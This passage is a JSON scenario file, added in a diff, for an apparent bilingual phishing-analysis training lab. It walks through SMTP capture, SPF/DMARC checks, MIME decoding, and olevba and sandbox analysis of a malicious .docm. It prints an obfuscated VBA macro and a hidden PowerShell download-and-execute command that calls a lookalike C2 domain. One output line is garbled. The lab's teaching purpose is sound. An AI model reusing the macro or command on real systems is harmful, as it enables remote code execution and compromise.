@@ -1,0 +1,540 @@
+{
+  "id": "T1566.001-beginner",
+  "title": "SMTP 프로토콜과 매크로 공격 분석",
+  "titleEn": "SMTP Protocol and Macro Attack Analysis",
+  "titleVi": "",
+  "titleAr": "",
+  "duration": 10,
+  "phases": [
+    {
+      "label": "🔍 프로토콜 분석",
+      "labelEn": "🔍 Protocol Analysis",
+      "labelVi": "",
+      "labelAr": "",
+      "steps": [0, 1]
+    },
+    {
+      "label": "📎 첨부파일 분석",
+      "labelEn": "📎 Attachment Analysis",
+      "labelVi": "",
+      "labelAr": "",
+      "steps": [2, 3]
+    },
+    {
+      "label": "🛡️ 방어",
+      "labelEn": "🛡️ Defense",
+      "labelVi": "",
+      "labelAr": "",
+      "steps": [4, 5]
+    }
+  ],
+  "topoNodes": [
+    {
+      "id": "ext",
+      "label": "Attacker",
+      "x": 50,
+      "y": 60
+    },
+    {
+      "id": "smtp",
+      "label": "SMTP Relay",
+      "x": 175,
+      "y": 30
+    },
+    {
+      "id": "gw",
+      "label": "Email Gateway",
+      "x": 300,
+      "y": 30
+    },
+    {
+      "id": "mail",
+      "label": "Mail Server",
+      "x": 425,
+      "y": 30
+    },
+    {
+      "id": "pc",
+      "label": "User PC",
+      "x": 425,
+      "y": 90
+    }
+  ],
+  "topoEdges": [
+    {
+      "from": "ext",
+      "to": "smtp",
+      "minStep": 0
+    },
+    {
+      "from": "smtp",
+      "to": "gw",
+      "minStep": 0
+    },
+    {
+      "from": "gw",
+      "to": "mail",
+      "minStep": 1
+    },
+    {
+      "from": "mail",
+      "to": "pc",
+      "minStep": 2
+    }
+  ],
+  "desktopIcons": [
+    {
+      "name": "🗑️ Recycle Bin",
+      "icon": "🗑️"
+    },
+    {
+      "name": "Outlook",
+      "icon": "📧"
+    },
+    {
+      "name": "Wireshark",
+      "icon": "🦈"
+    },
+    {
+      "name": "CloudSec2024_Slides.docm",
+      "icon": "📄",
+      "alert": true
+    }
+  ],
+  "steps": [
+    {
+      "cmd": "tcpdump -i eth0 port 25 -A -c 50",
+      "out": "tcpdump: listening on eth0, link-type EN10MB\n\n09:15:33.001 IP 185.220.101.34.49152 > mail.{companyName}.com.25: Flags [S]\n09:15:33.002 IP mail.{companyName}.com.25 > 185.220.101.34.49152: Flags [S.]\n09:15:33.003 IP 185.220.101.34.49152 > mail.{companyName}.com.25: Flags [.]\n\n220 mail.{companyName}.com ESMTP Postfix\nEHLO mail-relay.cloudsec-conf.org\n250-mail.{companyName}.com\n250-STARTTLS\n250 OK\nMAIL FROM:<speaker@cloudsec-conf.org>\n250 2.1.0 Ok\nRCPT TO:<{userName}@{companyName}.com>\n250 2.1.5 Ok\nDATA\n354 End data with <CR><LF>.<CR><LF>\nFrom: CloudSec Conference <speaker@cloudsec-conf.org>\nTo: {userName}@{companyName}.com\nSubject: [CloudSec 2024] =?UTF-8?B?67mE6rO16rCc67Cc7ZGc7J6Q66OMIOqzteycoCDslYjrgrQ=?=\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"----=_Part_1234\"\n.\n250 2.0.0 Ok: queued as 4F2B1A3E\n\n[캡처 요약]\n  발신 IP:    185.220.101.34 (Tor Exit Node — 익명 네트워크)\n  EHLO 호스트: mail-relay.cloudsec-conf.org\n  MAIL FROM:  speaker@cloudsec-conf.org\n  RCPT TO:    {userName}@{companyName}.com",
+      "def": "[네트워크 모니터] SMTP 트래픽 감지 — Tor Exit Node에서 발신",
+      "defAction": "Source: 네트워크 IDS (Suricata)\nTarget: 인바운드 SMTP 포트 25\nAction: Tor 출구 노드 IP(185.220.101.34)에서 이메일 수신 감지, 추가 분석 진행",
+      "desc": "tcpdump로 네트워크에서 SMTP(이메일 전송) 트래픽을 캡처합니다. SMTP의 EHLO, MAIL FROM, RCPT TO 명령어를 통해 이메일의 실제 전송 경로를 확인할 수 있습니다.",
+      "descEn": "Capture SMTP (email transmission) traffic on the network using tcpdump. SMTP commands like EHLO, MAIL FROM, and RCPT TO reveal the actual email delivery path.",
+      "descVi": "",
+      "descAr": "",
+      "stepTitle": "SMTP 통신 분석",
+      "stepTitleEn": "SMTP Communication Analysis",
+      "stepTitleVi": "",
+      "stepTitleAr": "",
+      "feynman": "우체국에서 편지가 배달되는 과정을 직접 지켜보는 것과 같습니다. SMTP는 이메일을 배달하는 '우편 시스템'입니다. EHLO는 '안녕하세요, 저는 이 우체국입니다'라는 인사, MAIL FROM은 '보내는 사람은 이 사람입니다', RCPT TO는 '받는 사람은 이 사람입니다'라는 뜻입니다. 이 대화를 엿들으면 이메일의 진짜 출처를 알 수 있습니다.",
+      "feynmanEn": "It's like watching a letter being delivered at the post office. SMTP is the 'postal system' for email. EHLO is 'Hello, I'm this post office,' MAIL FROM is 'the sender is this person,' RCPT TO is 'the recipient is this person.' Eavesdropping on this conversation reveals the true origin.",
+      "feynmanVi": "",
+      "feynmanAr": "",
+      "expert": "tcpdump port 25 캡처로 SMTP envelope 정보를 추출합니다. EHLO 호스트명(mail-relay.cloudsec-conf.org)과 실제 소스 IP(185.220.101.34, Tor Exit Node)의 불일치가 핵심 IOC입니다. SMTP envelope의 MAIL FROM과 메시지 헤더의 From이 다를 수 있으며, 이는 스푸핑 탐지의 기본입니다.",
+      "expertEn": "tcpdump port 25 captures extract SMTP envelope information. The mismatch between EHLO hostname (mail-relay.cloudsec-conf.org) and actual source IP (185.220.101.34, Tor Exit Node) is a key IOC. SMTP envelope MAIL FROM can differ from message header From, which is fundamental to spoofing detection.",
+      "expertVi": "",
+      "expertAr": "",
+      "defTooltip": "🌐 네트워크: Tor 출구 노드(185.220.101.34)에서 SMTP 연결 감지",
+      "defTooltipEn": "🌐 Network: SMTP connection from Tor Exit Node (185.220.101.34) detected",
+      "defTooltipVi": "",
+      "defTooltipAr": "",
+      "hackerLog": {
+        "title": "smtp_capture.log",
+        "lines": [
+          {
+            "log": "IP 185.220.101.34 (Tor Exit Node)",
+            "desc": "💡 발신 IP가 Tor 익명 네트워크 — 공격자가 신원을 숨기고 있습니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "EHLO mail-relay.cloudsec-conf.org",
+            "desc": "💡 컨퍼런스 메일 서버를 사칭하고 있지만 실제 IP는 Tor입니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "MAIL FROM:<speaker@cloudsec-conf.org>",
+            "desc": "💡 SMTP 봉투의 발신자 — 헤더의 From과 다를 수 있어 스푸핑 확인 필요",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          }
+        ]
+      },
+      "terms": [
+        {
+          "name": "SMTP (Simple Mail Transfer Protocol)",
+          "desc": "이메일을 전송하는 표준 프로토콜. 포트 25(평문) 또는 587(암호화)을 사용하며, 서버 간 이메일을 전달합니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        },
+        {
+          "name": "Tor Exit Node",
+          "desc": "Tor 익명 네트워크의 출구 지점. 공격자가 실제 IP를 숨기기 위해 사용하며, 출구 노드 IP만 보입니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        }
+      ]
+    },
+    {
+      "cmd": "dig TXT cloudsec-conf.org +short && dig TXT _dmarc.cloudsec-conf.org +short",
+      "out": "\"v=spf1 include:_spf.google.com ~all\"\n\n\"v=DMARC1; p=none; rua=mailto:dmarc@cloudsec-conf.org\"\n\n[SPF/DKIM/DMARC 검증 결과]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📧 SPF (Sender Policy Framework):\n   레코드:  v=spf1 include:_spf.google.com ~all\n   검증:    185.220.101.34는 _spf.google.com에 미포함\n   결과:    ⚠️ SOFTFAIL (~all → 거부하지 않고 표시만)\n   분석:    ~all은 '실패해도 받아들이라'는 느슨한 정책\n            -all이었다면 이 이메일은 차단되었을 것\n\n📝 DKIM (DomainKeys Identified Mail):\n   서명:    없음\n   결과:    ⚠️ NONE (서명 미포함 — 위조 불가능하지만 검증도 불가)\n\n🛡️ DMARC (Domain-based Message Authentication):\n   정책:    p=none (실패해도 아무 조치 않음)\n   결과:    ⚠️ PASS (정책이 none이라 항상 통과)\n   분석:    p=reject였다면 SPF 실패 시 즉시 차단\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n❌ 종합: 3개 인증 모두 느슨한 설정 → 이메일 스푸핑에 취약\n   공격자가 이 도메인을 사칭하기 쉬운 상태입니다.",
+      "def": "[DNS 분석] SPF softfail + DKIM 없음 + DMARC p=none — 스푸핑 취약",
+      "defAction": "Source: DNS 레코드 조회\nTarget: cloudsec-conf.org\nAction: 느슨한 이메일 인증 설정 확인 — 해당 도메인 발신 이메일 주의 권고",
+      "desc": "dig 명령어로 발신 도메인의 SPF, DKIM, DMARC 레코드를 조회합니다. 이 3가지는 이메일의 진위를 검증하는 보안 장치인데, 설정이 느슨하면 누구나 해당 도메인을 사칭할 수 있습니다.",
+      "descEn": "Use the dig command to query SPF, DKIM, and DMARC records of the sender domain. These three are security mechanisms that verify email authenticity — if configured loosely, anyone can impersonate the domain.",
+      "descVi": "",
+      "descAr": "",
+      "stepTitle": "SPF/DKIM 레코드 검증",
+      "stepTitleEn": "SPF/DKIM Record Verification",
+      "stepTitleVi": "",
+      "stepTitleAr": "",
+      "feynman": "편지에 찍힌 공식 도장을 확인하는 것과 같습니다. SPF는 '이 우체국에서 보낸 편지가 맞는지' 확인하는 장치인데, ~all(소프트 실패)은 '가짜여도 일단 배달하라'는 느슨한 설정입니다. DKIM은 편지의 '봉인'인데 아예 없고, DMARC는 '가짜 편지를 어떻게 처리할지' 정하는 정책인데 p=none(아무것도 안 함)입니다.",
+      "feynmanEn": "It's like checking official stamps on a letter. SPF checks if 'the letter was really sent from this post office,' but ~all (softfail) means 'deliver it even if it's fake.' DKIM is like a letter 'seal' but doesn't exist here, and DMARC decides 'what to do with fake letters' but p=none means 'do nothing.'",
+      "feynmanVi": "",
+      "feynmanAr": "",
+      "expert": "SPF ~all(softfail)은 -all(hardfail)과 달리 SPF 실패 시에도 수신을 허용합니다. DKIM 서명 미적용은 메시지 무결성 검증이 불가능함을 의미합니다. DMARC p=none은 모니터링 전용으로, SPF/DKIM 실패 시에도 이메일을 차단하지 않습니다. 이 3중 약점이 스푸핑을 가능하게 합니다.",
+      "expertEn": "SPF ~all (softfail) allows reception on SPF failure unlike -all (hardfail). No DKIM signature means message integrity cannot be verified. DMARC p=none is monitoring-only, not blocking emails on SPF/DKIM failure. This triple weakness enables spoofing.",
+      "expertVi": "",
+      "expertAr": "",
+      "defTooltip": "🔐 DNS 분석: SPF ~all / DKIM 없음 / DMARC p=none — 이메일 스푸핑 취약 도메인",
+      "defTooltipEn": "🔐 DNS Analysis: SPF ~all / No DKIM / DMARC p=none — domain vulnerable to email spoofing",
+      "defTooltipVi": "",
+      "defTooltipAr": "",
+      "hackerLog": {
+        "title": "dns_spf_check.log",
+        "lines": [
+          {
+            "log": "SPF: ~all (SOFTFAIL)",
+            "desc": "💡 ~all은 느슨한 정책 — SPF 실패해도 이메일이 차단되지 않습니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "DKIM: NONE (서명 미포함)",
+            "desc": "💡 DKIM 서명이 없어 이메일 내용의 위변조를 확인할 수 없습니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "DMARC: p=none (조치 없음)",
+            "desc": "💡 인증 실패해도 아무 조치 않는 정책 — 공격자에게 열린 문과 같습니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          }
+        ]
+      },
+      "terms": [
+        {
+          "name": "SPF (Sender Policy Framework)",
+          "desc": "이메일 발신 서버를 검증하는 DNS 레코드. '이 도메인에서 이메일을 보낼 수 있는 서버 목록'을 정의합니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        },
+        {
+          "name": "DMARC (Domain-based Message Authentication)",
+          "desc": "SPF와 DKIM 검증이 실패한 이메일의 처리 방법을 정의하는 정책. p=reject(차단), p=quarantine(격리), p=none(무시) 3단계가 있습니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        }
+      ]
+    },
+    {
+      "cmd": "munpack attachment.eml && base64 -d payload.b64 > decoded_payload.bin && xxd decoded_payload.bin | head -20",
+      "out": "temstrstrstrst (langstrstrstrst strstrst strstrstrst)\nmunpack: stripping strst from  strst CloudSec2024_Slides.docm\n\n[MIME 구조 분석]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nContent-Type: multipart/mixed\n├── Part 1: text/html (charset=UTF-8)\n│   └── 이메일 본문 (HTML 형식)\n├── Part 2: application/vnd.ms-word.document.macroEnabled.12\n│   └── CloudSec2024_Slides.docm (Base64 인코딩)\n│       Name: CloudSec2024_Slides.docm\n│       Size: 856,032 bytes (decoded)\n│       Encoding: base64\n└── Part 3: image/png\n    └── cloudsec_logo.png (서명 이미지)\n\n[Base64 디코딩 결과 - decoded_payload.bin]\n00000000: 504b 0304 1400 0600 0800 0000 2100 .... PK........!.\n00000010: b2a7 6810 6301 0000 c805 0000 1300 0000 ..h.c...........\n00000020: 5b43 6f6e 7465 6e74 5f54 7970 6573 5d2e [Content_Types].\n00000030: 786d 6c20 a204 0228 a000 0200 0000 0000 xml ...........\n\n✅ PK 시그니처 확인 → ZIP 기반 OOXML 문서 (docm)\n⚠️ 매크로 포함 문서 형식 확인됨: macroEnabled.12",
+      "def": "[MIME 분석] Base64 인코딩된 매크로 문서(.docm) 추출 완료",
+      "defAction": "Source: MIME 파서\nTarget: 첨부파일 CloudSec2024_Slides.docm\nAction: Base64 디코딩 → PK(ZIP) 시그니처 확인 → 매크로 문서 확정",
+      "desc": "이메일 첨부파일은 MIME 형식으로 Base64 인코딩되어 전송됩니다. munpack으로 MIME 구조를 분리하고, base64 명령어로 디코딩하여 실제 파일을 추출합니다.",
+      "descEn": "Email attachments are transmitted in MIME format with Base64 encoding. Use munpack to separate the MIME structure and base64 command to decode and extract the actual file.",
+      "descVi": "",
+      "descAr": "",
+      "stepTitle": "MIME 구조 분석 및 Base64 디코딩",
+      "stepTitleEn": "MIME Structure Analysis and Base64 Decoding",
+      "stepTitleVi": "",
+      "stepTitleAr": "",
+      "feynman": "이메일 첨부파일은 택배 상자처럼 포장되어 전송됩니다. MIME은 이 '포장 규격'이고, Base64는 바이너리 파일을 텍스트로 변환하는 '진공 포장'입니다. munpack은 포장을 뜯는 도구이고, base64 -d는 진공 포장을 풀어 원래 파일을 꺼냅니다. PK라는 시그니처가 보이면 ZIP 기반 파일(docm)이라는 뜻입니다.",
+      "feynmanEn": "Email attachments are packaged like delivery boxes. MIME is the 'packaging standard,' and Base64 is 'vacuum packing' that converts binary to text. munpack opens the package, and base64 -d removes the vacuum seal to extract the original file. The PK signature indicates a ZIP-based file (docm).",
+      "feynmanVi": "",
+      "feynmanAr": "",
+      "expert": "MIME multipart/mixed 구조에서 Content-Transfer-Encoding: base64인 파트를 추출합니다. Base64 디코딩 후 매직 바이트 0x504B(PK)는 ZIP 컨테이너를 나타내며, OOXML(.docm)은 ZIP 기반입니다. Content-Type: application/vnd.ms-word.document.macroEnabled.12는 매크로 포함 문서의 MIME 타입입니다.",
+      "expertEn": "Extract the part with Content-Transfer-Encoding: base64 from MIME multipart/mixed structure. After Base64 decoding, magic bytes 0x504B (PK) indicate a ZIP container, and OOXML (.docm) is ZIP-based. Content-Type: application/vnd.ms-word.document.macroEnabled.12 is the MIME type for macro-enabled documents.",
+      "expertVi": "",
+      "expertAr": "",
+      "defTooltip": "📎 MIME 분석: Base64 디코딩으로 매크로 문서(PK 시그니처) 추출",
+      "defTooltipEn": "📎 MIME Analysis: Macro document (PK signature) extracted via Base64 decoding",
+      "defTooltipVi": "",
+      "defTooltipAr": "",
+      "hackerLog": {
+        "title": "mime_analysis.log",
+        "lines": [
+          {
+            "log": "Part 2: macroEnabled.12 — CloudSec2024_Slides.docm",
+            "desc": "💡 MIME 타입이 'macroEnabled' — 매크로가 포함된 문서입니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "Encoding: base64 / Size: 856,032 bytes",
+            "desc": "💡 856KB의 Base64 인코딩된 매크로 문서가 첨부되어 있습니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "504b 0304 ... PK (ZIP 시그니처)",
+            "desc": "💡 PK는 ZIP 파일의 매직 바이트 — .docm은 ZIP 기반 OOXML 형식입니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          }
+        ]
+      },
+      "terms": [
+        {
+          "name": "MIME (Multipurpose Internet Mail Extensions)",
+          "desc": "이메일에 텍스트 외의 데이터(첨부파일, HTML 등)를 포함하기 위한 표준. 이메일의 '포장 규격'입니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        },
+        {
+          "name": "Base64",
+          "desc": "바이너리 데이터를 텍스트(A-Z, a-z, 0-9, +, /)로 변환하는 인코딩 방식. 이메일처럼 텍스트만 전송할 수 있는 환경에서 파일을 보내기 위해 사용합니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        }
+      ]
+    },
+    {
+      "cmd": "olevba --detailed CloudSec2024_Slides.docm",
+      "out": "olevba 0.60.2 - https://github.com/decalage2/oletools\n\nFILE: CloudSec2024_Slides.docm\nType: OpenXML (Word 2007+)\nVBA MACRO ThisDocument.cls\nin file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[VBA 코드 분석]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nSub Auto_Open()\n  Dim wS As String\n  Dim hR As String\n  ' 난독화된 문자열 조합\n  wS = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)\n  ' → \"WScript\"\n  hR = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(115)\n  ' → \"https\"\n  \n  Dim obj As Object\n  Set obj = CreateObject(wS & \".Shell\")\n  obj.Run hR & \"://cdn-static.{companyName}-corp.com/update.ps1\", 0\n  ' → WScript.Shell.Run \"https://cdn-static.{companyName}-corp.com/update.ps1\"\nEnd Sub\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[탐지된 위험 패턴]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n+----------+----------------------+----------------------------------------+\n| Type     | Keyword              | Description                            |\n+----------+----------------------+----------------------------------------+\n| AutoExec | Auto_Open            | 문서 열기 시 자동 실행                  |\n| Suspicious| Chr()               | 문자열 난독화 (문자 하나씩 조합)         |\n| Suspicious| CreateObject        | 외부 객체 생성 (WScript.Shell)          |\n| Suspicious| .Run                | 외부 프로그램/스크립트 실행              |\n| IOC      | cdn-static.*corp.com | 의심스러운 C2 다운로드 URL              |\n+----------+----------------------+----------------------------------------+\n\n❌ 종합 판정: MALICIOUS (악성)\n   실행 체인: Auto_Open → Chr() 디코딩 → WScript.Shell → 원격 PS1 다운로드",
+      "def": "[정적 분석] 난독화된 VBA 매크로 — WScript.Shell + 원격 다운로드 패턴",
+      "defAction": "Source: olevba 상세 분석\nTarget: CloudSec2024_Slides.docm\nAction: VBA 코드 추출 완료, 실행 체인 및 C2 URL 식별, YARA 룰 생성",
+      "desc": "olevba --detailed 옵션으로 VBA 매크로의 전체 코드를 추출합니다. Chr() 함수로 한 글자씩 조합하는 난독화를 풀어 실제 실행되는 명령어를 확인합니다.",
+      "descEn": "Extract the complete VBA macro code using olevba --detailed. Deobfuscate Chr() function character-by-character assembly to reveal the actual executed commands.",
+      "descVi": "",
+      "descAr": "",
+      "stepTitle": "VBA 매크로 코드 추출",
+      "stepTitleEn": "VBA Macro Code Extraction",
+      "stepTitleVi": "",
+      "stepTitleAr": "",
+      "feynman": "암호로 쓴 편지를 해독하는 것과 같습니다. 공격자는 'WScript'라는 단어를 Chr(87) & Chr(83)... 처럼 한 글자씩 숫자로 분리해서 숨겼습니다. 87번=W, 83번=S... 이렇게 조합하면 WScript가 됩니다. 보안 도구가 'WScript'라는 키워드를 검색해도 찾을 수 없도록 만든 것입니다.",
+      "feynmanEn": "It's like decoding a letter written in cipher. The attacker hid the word 'WScript' by splitting it character by character: Chr(87) & Chr(83)... where 87=W, 83=S... assembling to WScript. This prevents security tools from finding the keyword 'WScript' through simple string searches.",
+      "feynmanVi": "",
+      "feynmanAr": "",
+      "expert": "Chr() 기반 문자열 난독화는 기초적이지만 시그니처 기반 탐지를 효과적으로 우회합니다. CreateObject(\"WScript.Shell\").Run은 Windows Script Host를 통한 실행으로, cmd.exe를 거치지 않아 프로세스 트리 기반 탐지를 회피합니다. 원격 PS1 다운로드 URL은 핵심 IOC입니다.",
+      "expertEn": "Chr()-based string obfuscation is basic but effectively evades signature-based detection. CreateObject(\"WScript.Shell\").Run executes via Windows Script Host, bypassing cmd.exe process tree detection. The remote PS1 download URL is a critical IOC.",
+      "expertVi": "",
+      "expertAr": "",
+      "defTooltip": "🔬 정적 분석: Chr() 난독화 해제 → WScript.Shell + 원격 PS1 다운로드 확인",
+      "defTooltipEn": "🔬 Static Analysis: Chr() deobfuscation → WScript.Shell + remote PS1 download confirmed",
+      "defTooltipVi": "",
+      "defTooltipAr": "",
+      "hackerLog": {
+        "title": "olevba_detailed.log",
+        "lines": [
+          {
+            "log": "Chr(87)&Chr(83)&... → \"WScript\"",
+            "desc": "💡 ASCII 코드를 하나씩 조합하여 키워드를 숨기는 난독화 기법입니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "CreateObject(\"WScript.Shell\").Run",
+            "desc": "💡 WScript.Shell로 외부 명령을 실행 — cmd.exe 없이 스크립트를 실행합니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "cdn-static.{companyName}-corp.com/update.ps1",
+            "desc": "💡 회사 도메인을 사칭한 C2 서버에서 2단계 악성코드를 다운로드합니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          }
+        ]
+      },
+      "terms": [
+        {
+          "name": "난독화 (Obfuscation)",
+          "desc": "코드의 의미를 숨기기 위해 복잡하게 변환하는 기법. 보안 도구의 키워드 탐지를 우회하기 위해 사용합니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        },
+        {
+          "name": "WScript.Shell",
+          "desc": "Windows Script Host의 셸 객체. 외부 프로그램을 실행할 수 있어 악성 매크로에서 자주 악용됩니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        }
+      ]
+    },
+    {
+      "cmd": "python3 macro_analyzer.py --sandbox --trace CloudSec2024_Slides.docm",
+      "out": "[Sandbox 분석 시작]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n환경: Windows 10 x64 (격리 VM)\n제한시간: 120초\n\n[실행 추적 (Execution Trace)]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nT+0.0s   WINWORD.EXE 시작\nT+0.3s   CloudSec2024_Slides.docm 로드\nT+1.2s   사용자 시뮬레이션: \"콘텐츠 사용\" 클릭\nT+1.3s   ✅ Auto_Open() 트리거\nT+1.5s   ✅ Chr() 디코딩 → \"WScript.Shell\" 조합\nT+1.8s   ✅ CreateObject(\"WScript.Shell\") 생성\nT+2.0s   ✅ .Run 실행:\n            wscript.exe → powershell.exe -w hidden\n            -ep bypass -c \"IEX(New-Object Net.WebClient).\n            DownloadString('https://cdn-static.{companyName}-corp.com/update.ps1')\"\n\nT+2.5s   🌐 DNS 조회: cdn-static.{companyName}-corp.com → 185.220.101.34\nT+3.1s   🌐 HTTPS 연결: 185.220.101.34:443\nT+3.8s   📥 update.ps1 다운로드 (4.2KB)\nT+4.0s   ✅ PowerShell IEX 실행 (메모리 내)\nT+4.5s   🌐 C2 비콘 전송: 185.220.101.34:8443/beacon\nT+5.0s   ✅ 시스템 정보 수집 (hostname, OS, user)\nT+5.5s   🌐 C2 응답: {\"cmd\":\"persist\",\"method\":\"registry\"}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n[IOC (침해 지표) 추출]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  C2 IP:      185.220.101.34\n  C2 도메인:  cdn-static.{companyName}-corp.com\n  C2 포트:    443 (HTTPS), 8443 (비콘)\n  프로세스:   WINWORD.EXE → wscript.exe → powershell.exe\n  파일 해시:  SHA256: a3f2c8...7b91e4\n  다운로드:   update.ps1 (4.2KB)",
+      "def": "[샌드박스] 매크로 실행 시뮬레이션 — C2 연결 및 시스템 정보 유출 확인",
+      "defAction": "Source: 격리 샌드박스 (VM)\nTarget: CloudSec2024_Slides.docm\nAction: 실행 체인 전체 추적 완료, C2 IP/도메인/포트 식별, IOC 목록 생성",
+      "desc": "안전한 가상 환경(샌드박스)에서 매크로를 실제로 실행하여 어떤 일이 일어나는지 추적합니다. 네트워크 연결, 파일 생성, 프로세스 실행 등 모든 행위를 기록합니다.",
+      "descEn": "Execute the macro in a safe virtual environment (sandbox) and trace what happens. All behaviors including network connections, file creation, and process execution are recorded.",
+      "descVi": "",
+      "descAr": "",
+      "stepTitle": "매크로 실행 시뮬레이션",
+      "stepTitleEn": "Macro Execution Simulation",
+      "stepTitleVi": "",
+      "stepTitleAr": "",
+      "feynman": "폭발물 처리반이 의심 물건을 방폭 컨테이너 안에서 터뜨려보는 것과 같습니다. 샌드박스는 악성 코드를 안전하게 실행할 수 있는 '방폭실'입니다. 이 안에서 매크로를 실행하면 실제 컴퓨터에 피해 없이 공격의 전체 과정을 관찰할 수 있습니다. Word→WScript→PowerShell→C2 연결까지 5.5초 만에 컴퓨터가 장악됩니다.",
+      "feynmanEn": "It's like a bomb squad detonating a suspicious item in a blast container. A sandbox is a 'blast room' where malicious code can be safely executed. Running the macro inside lets you observe the entire attack without harming the real computer. In just 5.5 seconds: Word→WScript→PowerShell→C2 connection — the computer is compromised.",
+      "feynmanVi": "",
+      "feynmanAr": "",
+      "expert": "동적 분석(샌드박스)은 정적 분석의 한계를 보완합니다. 실행 추적으로 WScript.Shell→PowerShell(-w hidden -ep bypass) 체인을 확인하고, IEX(Invoke-Expression)로 메모리 내 실행하는 파일리스 기법을 관찰합니다. C2 비콘의 JSON 응답({\"cmd\":\"persist\"})은 지속성 확보 명령입니다.",
+      "expertEn": "Dynamic analysis (sandbox) complements static analysis limitations. Execution tracing confirms WScript.Shell→PowerShell (-w hidden -ep bypass) chain and observes fileless technique via IEX (Invoke-Expression) in-memory execution. C2 beacon JSON response ({\"cmd\":\"persist\"}) is a persistence establishment command.",
+      "expertVi": "",
+      "expertAr": "",
+      "defTooltip": "🧪 샌드박스: 5.5초 내 전체 공격 체인 실행 확인 — C2 IP/도메인 식별 완료",
+      "defTooltipEn": "🧪 Sandbox: Full attack chain executed in 5.5s — C2 IP/domain identified",
+      "defTooltipVi": "",
+      "defTooltipAr": "",
+      "hackerLog": {
+        "title": "sandbox_trace.log",
+        "lines": [
+          {
+            "log": "T+2.0s wscript.exe → powershell.exe -w hidden",
+            "desc": "💡 WScript가 숨겨진 PowerShell을 실행 — 사용자에게 보이지 않습니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "T+3.8s update.ps1 다운로드 (4.2KB)",
+            "desc": "💡 2단계 악성코드를 C2 서버에서 다운로드 — 파일리스 공격의 핵심",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          },
+          {
+            "log": "T+5.5s C2 응답: {\"cmd\":\"persist\"}",
+            "desc": "💡 공격자가 컴퓨터에 '지속 접근' 설정을 명령했습니다",
+            "descEn": "",
+            "descVi": "",
+            "descAr": ""
+          }
+        ]
+      },
+      "terms": [
+        {
+          "name": "샌드박스 (Sandbox)",
+          "desc": "악성 코드를 안전하게 실행할 수 있는 격리된 가상 환경. 실제 시스템에 영향 없이 악성 행위를 관찰할 수 있습니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        },
+        {
+          "name": "C2 비콘 (Beacon)",
+          "desc": "감염된 컴퓨터가 공격자 서버에 주기적으로 보내는 신호. '저 여기 있어요, 명령을 주세요'라는 신호입니다",
+          "descEn": "",
+          "descVi": "",
+          "descAr": ""
+        }
+      ]
+    },
+    {
+      "cmd": "python3 postfix_filter.py --add-rule --block-sender cloudsec-conf.org --block-ip 185.220.101.34 --block-hash a3f2c87b91e4 --alert-all",
